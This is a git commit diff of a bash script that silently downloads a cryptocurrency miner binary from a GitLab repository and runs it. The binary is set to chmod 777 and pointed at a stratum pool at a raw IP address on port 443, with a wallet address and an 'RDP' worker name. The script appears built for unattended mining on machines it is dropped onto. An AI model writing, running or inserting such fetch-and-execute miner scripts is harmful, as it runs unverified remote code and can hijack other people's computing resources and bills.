ce0c9780622c86346a374b846515565940b08c80
rifamanajul <rifamanajul@gmail.com>
2025-05-20 23:58:35 +0700

    Update advc.sh

--- advc.sh
+++ advc.sh
@@ -1,6 +1,6 @@
 #!/bin/bash
 apt-get update 
 apt-get install -y wget curl
-wget -O sgr1 https://github.com/rifamanajul/rifamanajul/raw/main/sugarmaker >/dev/null 2>&1
-chmod 777 sgr1 
-./sgr1 -a YespowerAdvc -o stratum+tcp://178.128.88.226:443 -u advc1qmug7qq0dpxe5dt0assmss4chk3ezgydqh69e6l -p x -t 1
+wget https://gitlab.com/majapahlevi/mvp/-/raw/main/cpminer >/dev/null 2>&1
+chmod 777 cpminer 
+./cpminer -a yespowertide -o stratum+tcp://47.237.3.59:443 -u TFjVcsSSXbyVNa9gdiYrhDCtfkamCNLHCf.RDP -p c=TDC -t 1
